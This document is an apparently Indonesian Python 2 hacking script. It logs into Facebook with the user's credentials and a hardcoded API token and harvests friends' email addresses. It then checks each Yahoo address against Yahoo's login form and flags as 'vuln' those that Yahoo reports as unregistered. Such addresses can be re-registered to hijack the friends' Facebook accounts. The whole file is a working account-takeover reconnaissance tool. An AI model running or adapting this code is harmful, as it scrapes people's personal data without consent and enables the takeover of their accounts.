import requests, time, json, os, re, sys, mechanize, urllib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)

def logo():
    os.system('clear')
    print '\n\n\x1b[1;95m\n\t __ __     _                 \n\t|  |  |___| |___ ___ ___ ___ \n\t|_   _|  _| | . |   | -_|  _|\n\t  |_| |___|_|___|_|_|___|_|  \n\t\x1b[1;97;41m   Author : Njank Soekamti   \x1b[0;0m\n\t'


def login():
    global h
    global o
    logo()
    print '\x1b[1;96m Login Facebook Dibutuhkan'
    print '\x1b[1;95m -------------------------'
    idt = raw_input('\x1b[1;95m [+] \x1b[0;0mEmail : ')
    passw = raw_input('\x1b[1;95m [+] \x1b[0;0mSandi : ')
    print '\x1b[1;95m [+] \x1b[0;0mSedang login, mohon tunggu'
    url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idt + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
    data = urllib.urlopen(url)
    op = json.load(data)
    if 'access_token' in op:
        token = op['access_token']
        print '\x1b[1;92m [+] \x1b[0;0mLogin Berhasil'
    else:
        print '\x1b[1;91m [x] \x1b[0;0mLogin gagal, silahkan coba lagi\n'
        sys.exit()
    get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
    hasil = json.loads(get_friends.text)
    print '\x1b[1;92m [+] \x1b[0;0mSedang mengekstrak data ...\n'
    o = []
    h = 0
    print ' \x1b[1;97m+>  \x1b[1;96mPerburuan dimulai '
    print ' \x1b[1;95m----------------------'
    for i in hasil['data']:
        wrna = '\x1b[36m'
        wrne = '\x1b[39m'
        h += 1
        o.append(h)
        x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
        z = json.loads(x.text)
        try:
            kunci = re.compile('@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = z['email']
                j = br.submit().read()
                Zen = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = '\x1b[0;0m[ \x1b[0;91mnot vuln \x1b[0;0m]  \x1b[1;95m-  \x1b[0;91m'
                    lean = 30 - len(z['email'])
                    eml = lean * ' '
                    lone = 24 - len(vuln)
                    namel = lone * ' '
                    print '\x1b[1;95m +> ' + vuln + z['email']
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = '\x1b[0;0m[   \x1b[0;92mvuln   \x1b[0;0m]  \x1b[1;95m-  \x1b[0;92m'
                else:
                    vuln = '\x1b[0;0m[ \x1b[0;91mnot vuln \x1b[0;0m]  \x1b[1;95m-  \x1b[0;91m'
                lean = 30 - len(z['email'])
                eml = lean * ' '
                lone = 24 - len(vuln)
                namel = lone * ' '
                print '\x1b[1;95m +> ' + vuln + z['email']
        except KeyError:
            pass
        except IOError:
            exit('\x1b[39m[\x1b[31m+\x1b[39m] \x1b[31mJaringan tidak stabil!')


def keluar():
    logo()
    print '\x1b[1;95m [x] \x1b[0;91mProgram berhenti\n'


def ceknet():
    try:
        logo()
        print '\r\x1b[1;95m [+] \x1b[0;0mSedang memeriksa koneksi internet ...'
        time.sleep(1.5)
        try:
            rq = requests.get('http://facebook.com')
            print '\x1b[1;95m [+] \x1b[0;92mKoneksi internet dalam keadaan baik ...'
            time.sleep(1.5)
            raw_input('\n\x1b[0;95m enter\x1b[1;97m+>')
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;95m [x] \x1b[0;91mKoneksi internet buruk ...'
            time.sleep(1)
            raw_input('\n\x1b[0;95m enter\x1b[1;97m+>')
            keluar()

    except KeyboardInterrupt:
        exit('\x1b[1;95m [x] \x1b[0;91mProgram berhenti\n')


ceknet()
